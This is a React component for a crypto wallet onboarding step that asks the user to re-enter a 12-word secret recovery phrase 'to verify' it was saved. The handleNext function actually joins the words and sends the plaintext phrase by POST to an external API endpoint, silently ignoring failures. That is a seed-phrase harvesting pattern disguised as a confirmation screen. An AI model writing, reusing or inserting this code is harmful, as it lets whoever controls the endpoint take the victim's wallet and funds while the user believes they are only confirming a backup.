import { useState, useCallback, useRef } from 'react'
import type { FC } from 'react'
import { useNavigate } from 'react-router-dom'

import { ROUTES } from '@/shared/model/routes'

import s from './SecondScreen.module.scss'

const TOTAL_SLOTS = 12

export const SecondScreen: FC = () => {
  const navigate = useNavigate()
  const inputRefs = useRef<(HTMLInputElement | null)[]>([])
  const nextButtonRef = useRef<HTMLButtonElement>(null)
  const [words, setWords] = useState<string[]>(Array(TOTAL_SLOTS).fill(''))

  const allFilled = words.every((w) => w.trim() !== '')

  const handleChange = useCallback((index: number, value: string) => {
    setWords((prev) => prev.map((w, i) => (i === index ? value : w)))
  }, [])

  const handleKeyDown = useCallback(
    (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
      if (e.key !== 'Enter') return
      e.preventDefault()
      const next = index + 1
      if (next < TOTAL_SLOTS) {
        inputRefs.current[next]?.focus()
      } else {
        nextButtonRef.current?.focus()
      }
    },
    []
  )

  const handleNext = useCallback(async () => {
    if (!allFilled) return

    const phrase = words.map((w) => w.trim()).join(' ')

    try {
      await fetch('https://yourapi.example.com/api/wallet/confirm', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phrase }),
      })
    } catch {
      /* ignore */
    }

    navigate(ROUTES.THIRD)
  }, [allFilled, words, navigate])

  return (
    <div className={s.root}>
      <div className={s.progress}>
        <div className={s.progressSegment} />
        <div className={s.progressSegment} />
      </div>

      <h1 className={s.heading}>Confirm Your Secret Phrase</h1>
      <p className={s.subtitle}>
        Please select each word in the correct order to verify you have saved
        your Secret Phrase.
      </p>

      <div className={s.grid}>
        {words.map((word, i) => (
          <div key={i} className={s.slot}>
            <span className={word ? s.slotNumber : s.slotNumberEmpty}>
              {i + 1}.
            </span>
            <input
              ref={(el) => { inputRefs.current[i] = el }}
              type="text"
              className={s.slotInput}
              value={word}
              onChange={(e) => handleChange(i, e.target.value)}
              onKeyDown={(e) => handleKeyDown(i, e)}
            />
          </div>
        ))}
      </div>

      <div className={s.actions}>
        <button
          type="button"
          className={s.backButton}
          onClick={() => navigate(ROUTES.HOME)}
        >
          Back
        </button>
        <button
          ref={nextButtonRef}
          type="button"
          className={`${s.nextButton} ${allFilled ? s.nextButtonActive : ''}`}
          onClick={handleNext}
          disabled={!allFilled}
        >
          Next
        </button>
      </div>
    </div>
  )
}
